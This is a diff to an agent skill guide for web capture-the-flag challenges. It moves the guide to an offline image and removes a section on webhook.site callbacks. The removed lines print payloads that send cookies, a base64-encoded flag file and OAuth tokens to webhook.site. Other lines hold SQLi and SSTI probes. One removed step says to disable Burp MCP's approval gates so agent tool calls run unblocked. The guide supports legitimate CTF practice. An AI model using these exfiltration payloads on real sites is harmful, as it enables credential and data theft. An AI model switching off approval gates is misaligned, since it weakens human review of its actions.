@@ -15,37 +15,9 @@ Use this skill as a routing and execution guide for web-heavy challenges. Keep t
 
 ## Prerequisites
 
-**Python packages:** the image already ships `requests` and `httpx`.
-`sqlmap` and `flask-unsign` are **not available** -- write the request in
-Python or use `curl` instead.
-
-**Linux (apt):**
-```bash
-apt install hashcat jq curl
-```
-
-**macOS (Homebrew):**
-```bash
-brew install hashcat jq curl
-```
-
-**Go tools (all platforms, requires Go):**
-```bash
-go install github.com/ffuf/ffuf/v2@latest
-```
-
-**Manual install:**
-- ysoserial — [GitHub](https://github.com/frohoff/ysoserial), requires Java (Java deserialization payloads)
-- PayloadsAllTheThings — git clone to ctf-web/payloads/PayloadsAllTheThings (auto via install script or lazy clone)
-  ```bash
-  bash scripts/install_ctf_tools.sh pat   # PAT only
-  bash scripts/install_ctf_tools.sh all   # all tools including PAT
-  # manual fallback:
-  git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git ctf-web/payloads/PayloadsAllTheThings
-  ```
-  > PAT is optional and on-demand — not required at load time. The skill works without it (graceful degrade): `pat-reference.md` provides an offline index with exemplar payloads; bulk wordlists require the clone above.
-
-**MCP servers (optional):** Playwright MCP ([microsoft/playwright-mcp](https://github.com/microsoft/playwright-mcp)) for browser-dependent challenges (DOM XSS, admin bot, SPA client secrets) and Burp Suite MCP ([PortSwigger/mcp-server](https://github.com/PortSwigger/mcp-server)) for wire-level work (header-level HTTP/1.1+HTTP/2 control, smuggling, blind SSRF/XXE via Collaborator, proxy-history regex mining) — see [tools-mcp.md](tools-mcp.md). Two things to do before relying on Burp MCP: start Burp *before* the agent, and turn off the two approval gates in Burp's MCP tab or the first tool call blocks on a modal dialog.
+**Offline image: no installs and no internet.** `python3` already ships `requests`,
+`httpx`, `PIL` and `Crypto`, and `curl` works; `sqlmap`, `ffuf`, `nuclei` and
+`flask-unsign` are **not available** -- write the request in Python or with `curl`.
 
 ## Additional Resources
 
@@ -71,9 +43,9 @@ go install github.com/ffuf/ffuf/v2@latest
 - [frameworks-2026.md](frameworks-2026.md) - Nuxt 3/4, SvelteKit and Vue 3 decision cards: fingerprint in one request, the path-normalization differential batch, SSR payload cache leak (CVE-2026-71316), server-island template injection (CVE-2026-71320) and component instantiation (CVE-2026-71318), SvelteKit __data.json surface, remote-form prototype pollution (GHSA-866w-xmhq-wj7x), enhanced-form open redirect (CVE-2026-114060)
 - [cves.md](cves.md) - CVE-driven techniques you can match against challenge banners, headers, dependency leaks, or version strings
 - [field-notes.md](field-notes.md) - Long-form exploit notes: quick references for SQLi, XSS, LFI, JWT, SSTI, SSRF, command injection, XXE, deserialization, race conditions, auth bypass, and multi-stage chains
-- [tools-mcp.md](tools-mcp.md) - MCP server integration for web: Playwright MCP (admin-bot DOM XSS reproduction, live DOM/console/network inspection, `browser_network_requests` lists endpoints but only `browser_network_request part="response-body"` returns payloads) and Burp Suite official MCP (27 tools, approval gates that block the agent on a modal dialog, target triple decoupling socket from `Host:` header, `normalizeHttpContent` rewriting CR/LF in the request prelude, map-based HTTP/2 that cannot express duplicate headers, `send_to_intruder` stages only, proxy history truncating items at 5000 chars, Collaborator `payloadId`/`customData` Pro-only); when to use each vs curl and ffuf
+- [tools-mcp.md](tools-mcp.md) - MCP server integration for web: Playwright MCP (admin-bot DOM XSS reproduction, live DOM/console/network inspection, `browser_network_requests` lists endpoints but only `browser_network_request part="response-body"` returns payloads) and Burp Suite official MCP (27 tools, approval gates that block the agent on a modal dialog, target triple decoupling socket from `Host:` header, `normalizeHttpContent` rewriting CR/LF in the request prelude, map-based HTTP/2 that cannot express duplicate headers, `send_to_intruder` stages only, proxy history truncating items at 5000 chars, Collaborator `payloadId`/`customData` Pro-only); when to use each vs plain `curl`
 - [python-requests.md](python-requests.md) - Python requests toolkit: session scaffold, Burp-Intruder-like fuzzer (sync + ThreadPoolExecutor + httpx async), payload deploy from pat-reference.md wordlists, header/param spray, cookie/JWT, proxy
-- [pat-reference.md](pat-reference.md) — PayloadsAllTheThings index: bulk payloads for XSS/SQLi/SSRF/SSTI/LFI/Command Injection/Upload (requires PAT clone, see Prerequisites)
+- [pat-reference.md](pat-reference.md) — PayloadsAllTheThings index: offline exemplar payloads for XSS/SQLi/SSRF/SSTI/LFI/Command Injection/Upload
 
 ## When to Pivot
 
@@ -100,46 +72,26 @@ This searches for reference writeups via Tavily API and can help identify the ri
 4. Classify the likely bug family: injection, authz, parser mismatch, upload, trust proxy, state machine, or client-side execution.
 5. Build the smallest proof first: leak, bypass, or primitive. Save full exploit chaining for later.
 
-### Bulk payloads (PayloadsAllTheThings — on-demand)
+### Bulk payloads (PayloadsAllTheThings -- offline index only)
 
-This skill works without PAT at load time (graceful degrade): `pat-reference.md` and inline exemplars are available offline; bulk payloads require a PAT clone. After mapping the trust boundary (First-Pass Workflow), check [pat-reference.md](pat-reference.md) for the PAT directory that matches your bug class, then search bulk payloads:
-
-```bash
-# PAT payload search (requires PAT clone — see Prerequisites; gracefully skipped if missing)
-ls ctf-web/payloads/PayloadsAllTheThings 2>/dev/null | head
-grep -R "onerror" "ctf-web/payloads/PayloadsAllTheThings/XSS Injection" 2>/dev/null | head
-```
-
-Or via agent tools (no clone required for the index itself):
-
-```text
-Glob ctf-web/payloads/PayloadsAllTheThings/**/*.md
-Grep "union select" ctf-web/payloads/PayloadsAllTheThings
-```
-
-If `ctf-web/payloads/PayloadsAllTheThings/.git` is missing, the agent lazy-clones on demand:
-
-```bash
-[ -d "ctf-web/payloads/PayloadsAllTheThings/.git" ] || git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git ctf-web/payloads/PayloadsAllTheThings
-```
+No PAT clone is possible offline and no network fetch will succeed. Use
+[pat-reference.md](pat-reference.md) instead: it indexes the payload families by bug
+class with exemplar payloads. Pick the matching section, adapt those exemplars and
+the inline samples in this file, and send the request yourself.
 
 ## Quick Start Commands
 
 ```bash
 # Recon
-curl -sI https://target.com
-ffuf -u https://target.com/FUZZ -w wordlist.txt
+curl -si https://target.com/
 curl -s https://target.com/robots.txt
+curl -sI https://target.com/
 
-# SQLi quick test
-sqlmap -u "https://target.com/page?id=1" --batch --dbs
+# SQLi quick test (no sqlmap: send the payload yourself)
+curl -s "https://target.com/page?id=1%27"
 
 # JWT decode (no verification)
-echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | jq .
-
-# Cookie decode (Flask)
-flask-unsign --decode --cookie '<cookie>'
-flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt
+python3 -c "import base64,json,sys;p=sys.argv[1].split('.')[1];print(json.loads(base64.urlsafe_b64decode(p+'='*(-len(p)%4))))" '<token>'
 
 # SSTI probes
 curl "https://target.com/page?name={{7*7}}"
@@ -191,42 +143,11 @@ For complex scenarios (CSRF tokens, frontend encryption, JSON APIs, Basic Auth, 
 - SSRF -> metadata or internal API -> credential leak -> code execution
 - SQLi or NoSQL injection -> credential bypass -> second-stage template or upload abuse
 
-## Webhook Callbacks (webhook.site)
+## Callbacks (offline)
 
-For any exploit that needs a callback URL (XSS admin bot, SSRF exfiltration, OAuth redirect abuse, blind injection with out-of-band data), use [webhook.site](https://webhook.site) to instantly receive and inspect incoming requests.
-
-**Create a token (get a callback URL):**
-```bash
-curl -X POST https://webhook.site/token
-# Returns {"uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx", ...}
-# Your callback URL: https://webhook.site/<uuid>
-```
-
-**Use the callback URL in your exploit:**
-```bash
-# XSS payload with webhook callback
-curl -X POST https://target.com/api/report \
-  -H "Content-Type: application/json" \
-  -d '{"url": "https://webhook.site/<uuid>/steal?cookie=" + document.cookie}'
-
-# SSRF exfiltration via webhook
-curl "https://target.com/ssrf?url=https://webhook.site/<uuid>/?data=$(cat /flag.txt | base64)"
-
-# OAuth redirect abuse
-curl "https://target.com/auth?redirect=https://webhook.site/<uuid>/token"
-```
-
-**Retrieve the last received request:**
-```bash
-curl "https://webhook.site/token/<uuid>/request/latest/raw" \
-  -H "accept: application/json" \
-  -H "api-key: <uuid>"
-```
-
-**When to use webhook.site vs Burp Collaborator vs interactsh:**
-- **webhook.site** — fastest setup, browser-visible UI, no install needed; best for quick CTF callbacks
-- **Burp Collaborator** — better for blind XSS/SSRF when using Burp Suite as proxy
-- **interactsh** — OOB interaction correlation for complex multi-step exploits
+No outbound callback receiver is reachable from this image: blind and reverse-connection
+payloads cannot be observed from outside. Route those needs through timing-based blind
+injection, or a same-host service log / polling endpoint you can read from the target.
 
 ## Deep-Dive Notes
 
